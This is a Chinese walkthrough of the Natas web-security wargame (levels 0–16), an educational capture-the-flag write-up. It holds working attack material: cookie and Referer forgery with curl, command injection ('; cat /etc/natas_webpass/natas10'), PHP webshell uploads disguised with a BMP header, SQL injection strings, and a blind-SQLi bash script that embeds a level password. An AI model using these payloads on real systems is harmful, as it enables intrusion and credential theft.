# natas

## 0-1

基本的看源代码方法：右键--查看网页源代码。

## 1-2

禁用了右键，但是可以`F12`或者`Ctrl-U`查看源代码。

## 2-3

源代码里有`/files/pixel.png`，指向了一个`PNG`文件。

查看`/files/`目录发现`user.txt`得到密码。

**结论**：不要公开不该公开的文件和目录。

## 3-4

源代码注释写到`Not even Google will find it this time`，不可被搜索到。

直接使用`site:`进行搜索即可找到目录。

同时“不可被搜索到”说明存在`robots.txt`阻止搜索引擎，查看可以找到目录。

## 4-5

显示提示：

```
You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
```

说明获取密码需要从指定网站访问，但是该指定网站不可直接访问，使用`curl -e`伪造`referer`即可：

```shell
curl -u "natas4:***" -e "http://natas5.natas.labs.overthewire.org/" "http://natas4.natas.labs.overthewire.org/"
```

## 5-6

显示提示：

```
Access disallowed. You are not logged in
```

想到一般网站的登陆使用`cookie`实现，发现`cookie`中有一项`loggedin=0`，使用`curl -b`伪造此`cookie`即可：

```shell
curl -u "natas5:***" -b "loggedin=1" "http://natas5.natas.labs.overthewire.org/"
```

**结论**：要熟练掌握`ssh`，`curl`等指令伪装身份和伪造数据。

## 6-7

发现要`input secret`。

查看源码发现一段`PHP`，引用了文件`includes/secret.inc`。

前往即可找到`secret`，输入后得到密码。

## 7-8

出现俩链接`Home`，`About`。

既然用的是`page=`，又没有做任何限制，直接`page=/etc/natas_webpass/natas8`就行了。

## 8-9

又要`input secret`。

分析一下`PHP`中有用的东西：

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

encodeSecret($_POST['secret']) == $encodedSecret
```

也就是说，网页把输入的`secret`依次做了`base64`、`rev`和`bin2hex`。

那么把`encodedSecret`给`hex2bin`、`rev`再`base64 -d`一下就是`secret`了。

**结论**：双向的加密方式如果公开就等同于摆设。

## 9-10

有一个`word search`功能，实现方法是一个`Bash`。

```bash
grep -i $key dictionary.txt
```

`dictionary.txt`并没有什么有价值的东西，但重点在于`$key`左右没有引号。

尝试“搜索”`--help`，果然得到了帮助页面。

那么使用`;`隔开指令，直接尝试“搜索”`; cat /etc/natas_webpass/natas10; cat`就得到密码。

## 10-11

同样是那个`search`，但是禁用了`;|&`三个字符。

所以要考虑如何巧妙应用`grep`。

`grep`可以直接搜索多文件，用法`grep "***" FILE1 FILE2 ...`。

“搜索”`"[a..z0..9]" /etc/natas_webpass/natas10`

**结论**：网站中的有权限动作不要给用户可乘之机。

## 11-12

居然可以自己设置颜色欸，还用`cookie`保存了下来。

看源代码发现`cookie`里除了`bgcolor`还存了一个`showpassword`。

分析有用的`PHP`源码：

```php
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}

$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);

setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
```

上面一个是解密过程，一个是加密过程，都用到了自定义的`xor_encrypt()`函数（关于`$key`循环异或）。

按照源码把`cookie`给`base64 -d`以后得到一个$41$位字符串。

按照源码把`array`给`json_encode()`以后也得到一个$41$位字符串：

```
{"showpassword":"no","bgcolor":"#ffffff"}
```

顺次异或，得到`$key='qw8J'`。

把`no`改成`yes`加密以后用`curl`上传。

**结论**：再一次证实，双向的加密方式如果公开就等同于摆设。

## 12-13

发现可以上传一个`JPEG`。

```php
$ext = pathinfo($fn, PATHINFO_EXTENSION); 
```

这句话说明上传文件的后缀名是由`filename`决定的，而直接上传会被钦点命名为`jpg`。

所以用`curl`上次一个`php`去读密码就好了

```bash
curl -isu natas12:*** 'http://natas12.natas.labs.overthewire.org' -F filename=a.php -F "uploadedfile=@-;filename=a.php" <<< '<?php passthru("cat /etc/natas_webpass/natas13"); ?>'
```

##  13-14

发现这次会用`exif_imagetype`来检查文件是否是文件。

我们知道图像文件都是有一个特殊的头的，`exif_imagetype`就是检查头。

把`php`伪装即可，最方便的是`bmp`文件，开头加上`BM`就行了。

```bash
curl -isu natas13:****** 'http://natas13.natas.labs.overthewire.org' -F filename=a.php -F "uploadedfile=@-;filename=a.php" <<< 'BM<?php passthru("cat /etc/natas_webpass/natas14"); ?>'
```

**结论**：上传文件要控制住类型。

## 14-15

发现要输密码，实际上是干了什么呢？是把一个字符串传入`mysql_query()`了。

字符串长这样：

```php
"SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""
```

所以让这个`query`强制从中间断开然后使其直接成立，比如设定`username='" or 1 #'`，其中`#`用来把后面直接变成注释。

## 15-16

这次只会返回有没有符合条件的数据了。

用在`query`后面添加额外字段的方法可以一起验证`password`，但这样为了获取密码而暴力不可取。

但是传入的`query`的`where`条件是可以写一般的表达式的，比如`password > "..."`。那么可以考虑每一位二分答案。

一开始没注意到`mysql`是大小写不敏感的，于是弄出来的密码全是大写字母。用`ascii`比较就会好很多。

下面是我的代码（我字符串玩不来啊）

```bash
str="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
str21="natas16\" and ascii(mid(password,"
str22=",1)) > ascii('"
str23="') #"
str3="password="
for i in {23..54}
do
	l=0
	r=61
	mid=0
	pos=0
	let "pos=i-22"
	while [ $l -lt $r ]
	do
		let "mid=(l + r) / 2"
		qry=${str21}"$pos"${str22}${str:$mid:1}${str23}
		c=`curl -isu natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J 'http://natas15.natas.labs.overthewire.org/index.php?debug=1' -F username="$qry" | grep "doesn't"`
		if [ "$c""x" == "x" ]; then
			let "l=mid + 1"
		else
			let "r=mid"
		fi
	done
	str3=${str3}${str:$l:1}
done
echo $str3
read -n 1
```

**结论**：小心`mysql`的漏洞。